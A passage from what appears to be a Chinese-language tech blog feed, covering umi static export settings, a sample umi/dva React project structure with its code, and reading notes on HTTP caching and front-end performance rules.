<p>umi build 会生成，<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./dist</span><br><span class="line">├── index.html</span><br><span class="line">├── list.html</span><br><span class="line">└── static</span><br><span class="line">    ├── pages__index.5c0f5f51.async.js</span><br><span class="line">    ├── pages__list.f940b099.async.js</span><br><span class="line">    ├── umi.2924fdb7.js</span><br><span class="line">    └── umi.cfe3ffab.css</span><br></pre></td></tr></table></figure></p>
<h2 id="静态化后输出到任意路径"><a href="#静态化后输出到任意路径" class="headerlink" title="静态化后输出到任意路径"></a>静态化后输出到任意路径</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  exportStatic: &#123;</span><br><span class="line">    htmlSuffix: <span class="literal">true</span>,</span><br><span class="line">    dynamicRoot: <span class="literal">true</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>基于umi的项目搭建</title>
    <url>/2019/05/05/%E5%9F%BA%E4%BA%8Eumi%E7%9A%84%E9%A1%B9%E7%9B%AE%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<p>最近看了蚂蚁金服的可插拔的企业级react应用框架<a href="https://umijs.org/zh/guide/" target="_blank" rel="noopener">umi</a>。相比自己现有的开发模式具备较多优点，可更好地支持企业级开发。其中较为明显的两点是:</p>
<p>1.基于路由，模块拆分更加直观和规范。<br>2.基于redux的数据流方案(dva)，满足大型应用对数据流控制的要求。model层解耦，更利于业务逻辑编写和维护。</p>
<a id="more"></a>
<p>初步写了一个示例项目<a href="https://github.com/mfaying/project-framework" target="_blank" rel="noopener">project-framework</a>,以下以此项目为例做一些说明。此外官方还有一系列 <a href="https://umijs.org/zh/guide/examples.html" target="_blank" rel="noopener">示例项目</a> 可以参考，其中 <a href="https://github.com/zuiidea/antd-admin" target="_blank" rel="noopener">antd-admin</a> 是antd+dva较为完整的示例。</p>
<h2 id="1-基于路由，模块拆分更加直观和规范化"><a href="#1-基于路由，模块拆分更加直观和规范化" class="headerlink" title="1.基于路由，模块拆分更加直观和规范化"></a>1.基于路由，模块拆分更加直观和规范化</h2><p>项目基本结构图如下<br><img src="https://mfaying.github.io/images/umi/1.jpg" alt="avatar"><br>主要文件说明:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config --配置文件</span><br><span class="line">mock --mock数据文件</span><br><span class="line">src --源文件</span><br><span class="line">  layouts --全局布局</span><br><span class="line">  models --全局级别的数据</span><br><span class="line">  pages --页面文件</span><br><span class="line">    goods --商品页</span><br><span class="line">      components --商品组件</span><br><span class="line">        goods-list.js --商品列表</span><br><span class="line">        search-bar.js --搜索框</span><br><span class="line">      services --商品页api请求构造</span><br><span class="line">      index.js --商品页入口文件</span><br><span class="line">      model.js --商品页的数据</span><br><span class="line">    index.js --主页</span><br><span class="line">  services --整个应用所有的api接口</span><br><span class="line">    api.js --api url</span><br><span class="line">    global.js --全局数据相关的api请求构造</span><br><span class="line">    index.js --api接口入口文件</span><br><span class="line">  utils --工具包</span><br></pre></td></tr></table></figure></p>
<p>可以看到我们的工程模块是基于路由划分的，拆分直观且合理，下面具体介绍其中一些文件夹:</p>
<p>mock –mock数据文件<br>  goods.js –商品页数据mock文件<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// mock/goods.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; apiPrefix &#125; <span class="keyword">from</span> <span class="string">'../config/config.js'</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  [<span class="string">`GET <span class="subst">$&#123;apiPrefix&#125;</span>/goods`</span>](req, res) &#123;</span><br><span class="line">    <span class="keyword">const</span> data = &#123;</span><br><span class="line">      data: [&#123;</span><br><span class="line">        goodName: <span class="string">'商品1'</span></span><br><span class="line">      &#125;,&#123;</span><br><span class="line">        goodName: <span class="string">'商品2'</span></span><br><span class="line">      &#125;,&#123;</span><br><span class="line">        goodName: <span class="string">'商品3'</span></span><br><span class="line">      &#125;]</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">if</span> (data) &#123;</span><br><span class="line">      res.status(<span class="number">200</span>).json(data)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>src –源文件<br>  layouts –全局布局<br>    index.js –全局页面入口文件<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; connect &#125; <span class="keyword">from</span> <span class="string">'dva'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Layout, Menu, Icon &#125; <span class="keyword">from</span> <span class="string">'antd'</span>;</span><br><span class="line"><span class="keyword">import</span> Link <span class="keyword">from</span> <span class="string">'umi/link'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; Header, Sider &#125; = Layout;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@connect(<span class="function">(<span class="params">&#123; global &#125;</span>) =&gt;</span> (&#123; <span class="attr">userAuth</span>: global.userAuth &#125;))</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GlobalLayout</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    collapsed: <span class="literal">false</span>,</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  toggle = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">      collapsed: !<span class="keyword">this</span>.state.collapsed,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; userAuth &#125; = <span class="keyword">this</span>.props;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;Layout&gt;</span><br><span class="line">      &lt;Sider collapsed=&#123;<span class="keyword">this</span>.state.collapsed&#125;&gt;</span><br><span class="line">        &lt;Menu mode=<span class="string">"inline"</span> defaultSelectedKeys=&#123;[<span class="string">'1'</span>]&#125;&gt;</span><br><span class="line">          &lt;Menu.Item key=<span class="string">"1"</span>&gt;</span><br><span class="line">            &lt;Link to=<span class="string">"/"</span>&gt;</span><br><span class="line">              &lt;Icon type=<span class="string">"star"</span> /&gt;</span><br><span class="line">              &lt;span&gt;首页&lt;<span class="regexp">/span&gt;</span></span><br><span class="line"><span class="regexp">            &lt;/</span>Link&gt;</span><br><span class="line">          &lt;<span class="regexp">/Menu.Item&gt;</span></span><br><span class="line"><span class="regexp">          &lt;Menu.Item key="2"&gt;</span></span><br><span class="line"><span class="regexp">            &lt;Link to="goods"&gt;</span></span><br><span class="line"><span class="regexp">              &lt;Icon type="star" /</span>&gt;</span><br><span class="line">              &lt;span&gt;商品页&lt;<span class="regexp">/span&gt;</span></span><br><span class="line"><span class="regexp">            &lt;/</span>Link&gt;</span><br><span class="line">          &lt;<span class="regexp">/Menu.Item&gt;</span></span><br><span class="line"><span class="regexp">        &lt;/</span>Menu&gt;</span><br><span class="line">      &lt;<span class="regexp">/Sider&gt;</span></span><br><span class="line"><span class="regexp">      &lt;Layout&gt;</span></span><br><span class="line"><span class="regexp">        &lt;Header style=&#123;&#123; background: '#fff', padding: 0 &#125;&#125;&gt;</span></span><br><span class="line"><span class="regexp">          &lt;Icon</span></span><br><span class="line"><span class="regexp">            type=&#123;this.state.collapsed ? 'menu-unfold' : 'menu-fold'&#125;</span></span><br><span class="line"><span class="regexp">            onClick=&#123;this.toggle&#125;</span></span><br><span class="line"><span class="regexp">          /</span>&gt;</span><br><span class="line">          &lt;span&gt;权限校验:你的权限是:&#123;userAuth.auth&#125;&lt;<span class="regexp">/span&gt;</span></span><br><span class="line"><span class="regexp">        &lt;/</span>Header&gt;</span><br><span class="line">          &#123; <span class="keyword">this</span>.props.children &#125;</span><br><span class="line">      &lt;<span class="regexp">/Layout&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>Layout&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> GlobalLayout;</span><br></pre></td></tr></table></figure></p>
<p>src –源文件<br>  layouts –全局布局<br>  models –全局级别的数据<br>    global.js<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> api <span class="keyword">from</span> <span class="string">'../services'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; queryUserAuth &#125; = api</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  namespace: <span class="string">'global'</span>,</span><br><span class="line">  state: &#123;</span><br><span class="line">    userAuth: &#123;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  reducers: &#123;</span><br><span class="line">    setUserAuth(state, &#123; payload &#125;) &#123;</span><br><span class="line">      <span class="keyword">return</span> &#123; ...state, <span class="attr">userAuth</span>: payload &#125;;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  subscriptions: &#123;</span><br><span class="line">    setup(&#123; dispatch &#125;) &#123;</span><br><span class="line">      dispatch(&#123; <span class="attr">type</span>: <span class="string">'query'</span> &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  effects: &#123;</span><br><span class="line">    *query(&#123; payload &#125;, &#123; call, put, select &#125;) &#123;</span><br><span class="line">      <span class="keyword">const</span> &#123; success, data &#125; = <span class="keyword">yield</span> call(queryUserAuth, payload)</span><br><span class="line">      <span class="keyword">if</span> (success) &#123;</span><br><span class="line">        <span class="keyword">yield</span> put(&#123; <span class="attr">type</span>: <span class="string">'setUserAuth'</span>, <span class="attr">payload</span>: data&#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>src –源文件<br>  pages –页面文件<br>    goods –商品页<br>      model.js –商品页的数据<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> api <span class="keyword">from</span> <span class="string">'../../services'</span></span><br><span class="line"><span class="keyword">import</span> &#123; pathMatchRegexp &#125; <span class="keyword">from</span> <span class="string">'../../utils/path.js'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; queryGoods &#125; = api</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  namespace: <span class="string">'goods'</span>,</span><br><span class="line">  state: &#123;</span><br><span class="line">    goodsList: [],</span><br><span class="line">    searchGood: <span class="string">''</span></span><br><span class="line">  &#125;,</span><br><span class="line">  reducers: &#123;</span><br><span class="line">    setGoodsList(state, &#123; payload &#125;) &#123;</span><br><span class="line">      <span class="keyword">return</span> &#123; ...state, <span class="attr">goodsList</span>: payload &#125;;</span><br><span class="line">    &#125;,</span><br><span class="line">    setSearchGood(state, &#123; payload &#125;) &#123;</span><br><span class="line">      <span class="keyword">return</span> &#123; ...state, <span class="attr">searchGood</span>: payload &#125;;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  subscriptions: &#123;</span><br><span class="line">    setup(&#123; dispatch, history &#125;) &#123;</span><br><span class="line">      history.listen(<span class="function"><span class="params">location</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (pathMatchRegexp(<span class="string">'/goods'</span>, location.pathname)) &#123;</span><br><span class="line">          dispatch(&#123; <span class="attr">type</span>: <span class="string">'query'</span> &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  effects: &#123;</span><br><span class="line">    *query(&#123; payload &#125;, &#123; call, put, select &#125;) &#123;</span><br><span class="line">      <span class="keyword">const</span> &#123; success, data &#125; = <span class="keyword">yield</span> call(queryGoods, payload)</span><br><span class="line">      <span class="keyword">if</span> (success) &#123;</span><br><span class="line">        <span class="keyword">yield</span> put(&#123; <span class="attr">type</span>: <span class="string">'setGoodsList'</span>, <span class="attr">payload</span>: data&#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>src –源文件<br>  pages –页面文件<br>    goods –商品页<br>      services –商品页api请求构造<br>        goods.js<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; request &#125; <span class="keyword">from</span> <span class="string">'../../../utils'</span></span><br><span class="line"><span class="keyword">import</span> &#123; config &#125; <span class="keyword">from</span> <span class="string">'../../../../config/config'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; apiPrefix &#125; = config</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">query</span>(<span class="params">params</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> request(&#123;</span><br><span class="line">    url: <span class="string">`<span class="subst">$&#123;apiPrefix&#125;</span>/goods`</span>,</span><br><span class="line">    method: <span class="string">'get'</span>,</span><br><span class="line">    data: &#123;&#125;,</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>src –源文件<br>  services –整个应用所有的api接口<br>    api.js –api url<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  queryGoods: <span class="string">'/goods'</span>,</span><br><span class="line">  queryUserAuth: <span class="string">'/userAuth'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="2-基于redux的数据流方案-dva-，可满足大型应用对数据流控制的要求。model层解耦，更利于编写业务逻辑和维护。"><a href="#2-基于redux的数据流方案-dva-，可满足大型应用对数据流控制的要求。model层解耦，更利于编写业务逻辑和维护。" class="headerlink" title="2.基于redux的数据流方案(dva)，可满足大型应用对数据流控制的要求。model层解耦，更利于编写业务逻辑和维护。"></a>2.基于redux的数据流方案(dva)，可满足大型应用对数据流控制的要求。model层解耦，更利于编写业务逻辑和维护。</h2><p>由前面的model文件,比如下面商品页的数据。我们可以看到数据流可以很好进行控制。model是有层级的，上级的数据可以被所有的下级组件拿到，上级组件无法拿到下级和同级组件的数据。比如权限信息可以在全局共享，商品信息只在商品页使用，所以其他页面拿不到这个数据。如果其他页面也需要拿到商品信息数据，那应该将model定义的层级往上提升。这样的规则使得数据层级变得规范，更有利于大型项目数据流的维护。</p>
<p>src –源文件<br>  pages –页面文件<br>    goods –商品页<br>      model.js –商品页的数据<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> api <span class="keyword">from</span> <span class="string">'../../services'</span></span><br><span class="line"><span class="keyword">import</span> &#123; pathMatchRegexp &#125; <span class="keyword">from</span> <span class="string">'../../utils/path.js'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; queryGoods &#125; = api</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  namespace: <span class="string">'goods'</span>,</span><br><span class="line">  state: &#123;</span><br><span class="line">    goodsList: [],</span><br><span class="line">    searchGood: <span class="string">''</span></span><br><span class="line">  &#125;,</span><br><span class="line">  reducers: &#123;</span><br><span class="line">    setGoodsList(state, &#123; payload &#125;) &#123;</span><br><span class="line">      <span class="keyword">return</span> &#123; ...state, <span class="attr">goodsList</span>: payload &#125;;</span><br><span class="line">    &#125;,</span><br><span class="line">    setSearchGood(state, &#123; payload &#125;) &#123;</span><br><span class="line">      <span class="keyword">return</span> &#123; ...state, <span class="attr">searchGood</span>: payload &#125;;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  subscriptions: &#123;</span><br><span class="line">    setup(&#123; dispatch, history &#125;) &#123;</span><br><span class="line">      history.listen(<span class="function"><span class="params">location</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (pathMatchRegexp(<span class="string">'/goods'</span>, location.pathname)) &#123;</span><br><span class="line">          dispatch(&#123; <span class="attr">type</span>: <span class="string">'query'</span> &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  effects: &#123;</span><br><span class="line">    *query(&#123; payload &#125;, &#123; call, put, select &#125;) &#123;</span><br><span class="line">      <span class="keyword">const</span> &#123; success, data &#125; = <span class="keyword">yield</span> call(queryGoods, payload)</span><br><span class="line">      <span class="keyword">if</span> (success) &#123;</span><br><span class="line">        <span class="keyword">yield</span> put(&#123; <span class="attr">type</span>: <span class="string">'setGoodsList'</span>, <span class="attr">payload</span>: data&#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>umi</tag>
      </tags>
  </entry>
  <entry>
    <title>《高性能网站建设指南》(笔记)</title>
    <url>/2019/03/27/%E9%AB%98%E6%80%A7%E8%83%BD%E7%BD%91%E7%AB%99%E5%BB%BA%E8%AE%BE%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<p>《高性能网站建设指南》(笔记)<br><a id="more"></a></p>
<h2 id="前端性能的重要性"><a href="#前端性能的重要性" class="headerlink" title="前端性能的重要性"></a>前端性能的重要性</h2><p>只有10%~20%的最终用户响应时间是花在从web服务器获取html文档并传送到浏览器的，如果希望有效减少页面的响应时间，就必须关注剩余80%~90%的最终用户体验。</p>
<p>Yahoo首页首次访问html文档只占响应时间的5%，用户需要花费其余95%的时间中的大部分来等待组件的下载。还有一小部分时间花在解析html、脚本和样式表上面。(打开浏览器的network可以直观的看到各部分所花的时间)。</p>
<p>当第二次加载同一个url时，html文档占了总响应时间的12%。很多组件无需下载，因为它们已经存在于浏览器的缓存中了。</p>
<p>为此，后续内容会从前端对减少用户最终响应时间给出精确的指导，并提出14条提升性能的规则，这些规则按常规的优先级顺序列出。对于特定的网站，规则的适用性可能会不同。但一般来说，只需要遵守这些最佳实践就能节省25%或更多的时间。</p>
<h2 id="HTTP概述"><a href="#HTTP概述" class="headerlink" title="HTTP概述"></a>HTTP概述</h2><p>HTTP是浏览器和服务器通过Internet进行相互通信的协议。Http1.1是今天比较常见的版本，但是一些浏览器和服务器还在使用Http1.0。Http是一种客户端服务器协议，由请求和响应构成。浏览器向一个特定的url发送http请求，url对应的宿主服务器发回http响应。和很多Internet服务一样，该协议使用简单的纯文本格式。请求的类型有GET、POST、HEAD、PUT、DELETE、OPTIONS和TRACE。我们主要关注最常见的GET请求。</p>
<p>GET请求包含一个url，然后是请求头。http响应包含状态码、响应头和响应体。<br>下面的例子展示了一个get请求：<br><img src="https://mfaying.github.io/static/images/高性能网站建设指南/1.jpg" alt="avatar"></p>
<p>压缩</p>
<p>浏览器可以使用Accept-Encoding头来声明它支持压缩。服务器使用Content-Encoding头确认响应已被压缩。<br><img src="https://mfaying.github.io/static/images/高性能网站建设指南/2.jpg" alt="avatar"></p>
<p>条件GET请求</p>
<p>如果浏览器在其缓存中保留了组件的一个副本，但并不确定它是否仍然有效，就会生成一个条件get请求。如果确认缓存的副本仍然有效，浏览器就可以使用缓存中的副本，这会得到更小的响应和更快的用户体验。</p>
<p>典型情况下，缓存副本的有效性源自其最后修改时间。基于响应中的Last-Modified头，浏览器可以知道组件最后的修改时间，它会使用If-Modified-Since头将最后修改时间发送给服务器。<br><img src="https://mfaying.github.io/static/images/高性能网站建设指南/3.jpg" alt="avatar"></p>
<p>如果组件自生成日期以来没有改变过，服务器会返回一个“304 Not Modified”状态码并不在发送响应体。在http1.1中，ETag和If-None-Match头是进行条件get请求的另外一种方式。后续会讲到。</p>
<p>Expires</p>
<p>条件get请求和304响应仍需要在客户端和服务器之间进行一次往返确认，Expires头通过明确指出浏览器是否可以使用组件的缓存副本来消除这个需要。<br><img src="https://mfaying.github.io/static/images/高性能网站建设指南/4.jpg" alt="avatar"><br>当浏览器看到响应中有一个Expires头时，它会和相应的过期时间组件一起保存到其缓存中。只要组件没有过期，就会使用缓存而不会发送任何人http请求。</p>
<p>Keep-Alive</p>
<p>持久连接的引入解决了多对一请求服务器导致的socket连接低效性的问题，它使浏览器可以在一个单独的连接上进行多个请求。浏览器和服务器使用Connection头来指出对Keep-Alive的支持。在服务器的响应中Connection头看起来是一样的。<br><img src="https://mfaying.github.io/static/images/高性能网站建设指南/5.jpg" alt="avatar"></p>
<p>浏览器或服务器通过发送一个Connection:close头来关闭连接。Connection:keep-alive并不是http1.1中必需的，但很多浏览器和服务器都包含它。</p>
<p>http1.1中定义的管道可以在一个单独的socket上发送多个请求而无需等待响应。管道的性能优于持久连接，但一些浏览器并不支持管道。在管道被广泛应用之前，Keep-Alive依然是浏览器和服务器使用http的socket连接最有效的方式。</p>
<h1 id="规则1-减少HTTP请求"><a href="#规则1-减少HTTP请求" class="headerlink" title="规则1 减少HTTP请求"></a>规则1 减少HTTP请求</h1><p>改善响应时间的最简单途径就是减少组件的数量，并由此减少http请求的数量。本章介绍的技术即可以减少http请求，又能避免在性能和设计之间的冲突。</p>
<h2 id="图片地图"><a href="#图片地图" class="headerlink" title="图片地图"></a>图片地图</h2><p>一个导航栏上有五幅图片，点击一个图片会将你带到与之相关的链接。这可以通过五个分开的超链接、使用五个分开的图片来实现。然而，如果使用一个图片地图则可以更有效率，因为五个http请求被减少为只有一个http请求。响应时间将会降低，因为减少了HTTP开销。</p>
<p>图片地图有两种类型。服务器端图片地图将所有点击提交到同一个目标URL,向其传递用户点击的x、y坐标。web应用程序将该x、y坐标映射为适当的操作。客户端图片地图更加典型，因为它可以将用户的点击映射到一个操作，而无需向后端应用程序发送请求。映射通过html的map标签实现。<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">usemap</span>=<span class="string">"#map1"</span> <span class="attr">border</span>=<span class="string">0</span> <span class="attr">src</span>=<span class="string">"/images/imagemap.gif?t=1196816255"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">map</span> <span class="attr">name</span>=<span class="string">"map1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">area</span> <span class="attr">shape</span>=<span class="string">"rect"</span> <span class="attr">coords</span>=<span class="string">"0,0,31,31"</span> <span class="attr">href</span>=<span class="string">"home.html"</span> <span class="attr">title</span>=<span class="string">"Home"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">area</span> <span class="attr">shape</span>=<span class="string">"rect"</span> <span class="attr">coords</span>=<span class="string">"36,0,66,31"</span> <span class="attr">href</span>=<span class="string">"gifts.html"</span> <span class="attr">title</span>=<span class="string">"Gifts"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">area</span> <span class="attr">shape</span>=<span class="string">"rect"</span> <span class="attr">coords</span>=<span class="string">"71,0,101,31"</span> <span class="attr">href</span>=<span class="string">"cart.html"</span> <span class="attr">title</span>=<span class="string">"Cart"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">area</span> <span class="attr">shape</span>=<span class="string">"rect"</span> <span class="attr">coords</span>=<span class="string">"106,0,136,31"</span> <span class="attr">href</span>=<span class="string">"setting.html"</span> <span class="attr">title</span>=<span class="string">"Settings"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">area</span> <span class="attr">shape</span>=<span class="string">"rect"</span> <span class="attr">coords</span>=<span class="string">"141,0,171,31"</span> <span class="attr">href</span>=<span class="string">"help.html"</span> <span class="attr">title</span>=<span class="string">"Help"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>使用图片地图也有缺点。在定义图片地图上的区域坐标时，如果采取手工的方式则很难完成且容易出错，而且除了矩形之外几乎无法定义其他形状。</p>
<h2 id="CSS-Sprites"><a href="#CSS-Sprites" class="headerlink" title="CSS Sprites"></a>CSS Sprites</h2><p>和图片地图一样，CSS Sprites也可以合并图片，但更为灵活，任何支持背景图片的html元素都可以使用，如span或div。它和图片地图几乎一样快。图片地图中的图片必须是连续的，而css sprites则没有这个限制。<br><img src="https://mfaying.github.io/static/images/高性能网站建设指南/6.jpg" alt="avatar"><br>还有一个令人惊奇的优点，合并图片还降低了下载量，很多人会认为合并后的图片会比分离的图片的总和要大，因为合并后的图片中包含有附件的空白区域，但是实际上，它降低了图片自身的开销（颜色表、格式信息等等）。<br>如果需要在页面中为背景、按钮、导航栏、链接等提供大量图片，css sprites绝对是一种优秀的解决方案。——干净的标签、很少的图片和很短的响应时间。</p>
<h2 id="内联图片"><a href="#内联图片" class="headerlink" title="内联图片"></a>内联图片</h2><p>通过使用data:URL模式可以在web页面中包含图片但无需任何额外的HTTP请求。data:URL模式规范对它的描述为：允许将小块数据内联为立即数。数据就在其url自身之中，其格式如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data:[&lt;mediatype&gt;][;base64],&lt;data&gt;</span><br></pre></td></tr></table></figure></p>
<p>一个红色五角星形状的内联图片可以定义为：<br><img src="https://mfaying.github.io/static/images/高性能网站建设指南/7.jpg" alt="avatar"><br>该模式数据大小会有所限制。Base64编码会增加图片的大小，因此整体下载量会增加。</p>
<p>内联图片在跨越不同页面时不会缓存，所以不要去内联公司的logo图片，编码过的logo会导致页面变大。聪明的做法是使用css并将内联图片作为背景。将该css规则放在外部样式表中，这意味着数据可以缓存在样式表内部。<br>它和图片地图及css sprites的响应时间几乎一样，虽然外部样式表增加了一个额外的http请求，但被缓存后可以得到额外的收货。</p>
<h2 id="合并脚本和样式表"><a href="#合并脚本和样式表" class="headerlink" title="合并脚本和样式表"></a>合并脚本和样式表</h2><p>前端工程师必须选择是对js和css进行“内联”（也就是将其嵌在html文档中）还是将其放在外部的脚本和样式表中。一般来说，使用外部脚本和样式表对性能更有利。然而，如果遵循模块化的原则将代码分开放到多个小文件中，会降低性能，因为每个文件都会导致一个额外的http请求。</p>
<p>在理想情况下，一个页面应该使用不多于一个的脚本和样式表。</p>
<p>将所有的javascript合并为一个单独的文件在开发环境中很难完成。解决<br>的方法是遵循编译型语言的模式。保持javascript的模块化，而在生成过程中从一组特定的模块生成一个目标文件。</p>
<p>合并文件是很容易的，难的是如果页面需要大量的模块，组合的数量就会非常庞大。每个页面不一定会使用到每个模块，这值得花时间去分析一下你的页面，确保组合的数量是管理的。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>遵守减少Http请求的规则可以同时改善首次浏览和后续浏览的网站响应时间。</p>
<h1 id="使用内容发布网络"><a href="#使用内容发布网络" class="headerlink" title="使用内容发布网络"></a>使用内容发布网络</h1><p>网站最初通常将其所有的服务器放在同一个地方。当用户群增加时，公司就必须面对服务器放置地点不再适用的事实，有必要在多个地理位置不同的服务器上部署内容。如果应用程序web服务器离用户更近，则一个http请求的响应时间将缩短。</p>
<p>内容发布网络（CDN）是一组分布在多个不同地理位置的web服务器，用于更加有效地向用户发布内容。向特定用户发布内容的服务器的选择基于对网路可用度的测量。例如，CDN可能选择网络阶跃数最小的服务器，或者具有最短响应时间的服务器。</p>
<p>除了缩短响应时间之外，CDN还可以带来其他优势。如备份、扩展存储能力、缓存、缓和web流量峰值压力。</p>
<p>CDN的缺点是你的响应时间可能会受到其他网站的影响，另外的缺点是你无法直接控制组件服务器所带来的特殊麻烦。例如，修改http响应头必须通过服务提供商来完成，如果CDN服务的性能下降了，你的工作质量也随之下降。</p>
<p>CDN用于发布静态内容，如图片、脚本、样式表和flash。提供动态html页面会引入特殊的存储需求，比如数据库连接、状态管理、验证、硬件和os优化等。这些复杂性超越了CDN的能力范围。</p>
<h1 id="添加Expires头"><a href="#添加Expires头" class="headerlink" title="添加Expires头"></a>添加Expires头</h1><p>规则3展示了如何配置组件，使其能够最大化地利用浏览器的缓存能力来改善页面的性能。</p>
<p>页面的访问者会进行很多http请求，但通过使用一个长久的expires头，使这些组件可以被缓存。长久的expires头最常用于图片，但应该将其用在所有组件上，包括脚本、样式表和flash。</p>
<h2 id="Expires头"><a href="#Expires头" class="headerlink" title="Expires头"></a>Expires头</h2><p>web服务器使用expires头来告诉web客户端它可以使用一个组件的当前副本，直到指定的时间为止。http规范中简要地称该头为“在这一日期/时间之后，响应将被认为是无效的”。它在http响应中发送。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Expires: Thu, 15 Apr 2010 20:00:00 GMT</span><br></pre></td></tr></table></figure></p>
<p>它告诉浏览器该响应的有效性持续到2010年4月15日为止。在到期前，浏览器在后续的页面浏览中会使用缓存的图片。</p>
<h2 id="Max-Age和mod-expires"><a href="#Max-Age和mod-expires" class="headerlink" title="Max-Age和mod_expires"></a>Max-Age和mod_expires</h2><p>HTTP1.1引入了Cache-Control头来克服Expires头的限制。因为Expires头使用一个特定的时间，它要求服务器和客户端的时钟严格同步。另外，过期日期需要经常检查，并且一旦未来这一天到来了，需要再服务器配置中提供一个新的日期。</p>
